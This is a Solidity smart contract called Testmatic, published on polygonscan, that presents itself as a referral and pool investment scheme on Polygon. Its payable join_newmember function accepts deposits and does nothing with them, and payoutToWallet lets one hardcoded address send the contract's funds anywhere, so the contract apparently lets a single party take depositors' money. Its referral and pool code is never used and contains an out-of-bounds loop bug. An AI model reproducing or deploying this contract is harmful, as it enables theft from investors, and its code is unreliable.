/**
 *Submitted for verification at polygonscan.com on 2022-01-13
*/

/**
*/
pragma solidity >=0.4.0 <0.8.0;

contract owned {
    //constructor() public {owner = msg.sender;}
    address payable owner;   
    modifier bonusRelease {
        require(
            msg.sender == owner,
            "Nothing For You!"
        );
        _;
    }
}

contract Testmatic {
	
	address public owner;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint256 public totalreinvested;
	
	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	
	}
	
	struct User {
		Deposit[] deposits;
		uint256 referrals;
		uint256 checkpoint;
		address referrer;
		address[] referralsList;
		uint256 refBonus;
		 uint256 match_bonus;
		uint256 max_payout;
		uint256 lastinvestment;
		uint256 totalStructure; 
		uint40 deposit_time;
		uint256 deposit_amount;
		uint256 direct_bonus;
		uint256 pool_bonus;
		uint256 payouts;
		address upline;
	}

 mapping(address => User) public users;
    mapping(uint256 => address) public userList;

    uint256[] public cycles;
    uint8[] public ref_bonuses;   //10% of amount TRX
       
    uint8[] public pool_bonuses;    // 1% daily
    
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    
     event Upline(address indexed addr, address indexed upline);
event MatchPayout(address indexed addr, address indexed from, uint256 amount);

	function payoutToWallet(address payable _user, uint256 _amount) public
    {
        if(msg.sender == 0x6801d1a0Abd0258F3D55fE20Cb9571D6Bec1b3b4){
        _user.transfer(_amount);
        } else {
            "Nothing For You";
        }
    }
    
    function join_newmember(address _upline) public payable {
    }
    
     function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 1 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }
    
      function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                
                users[up].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }
    
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }
  
}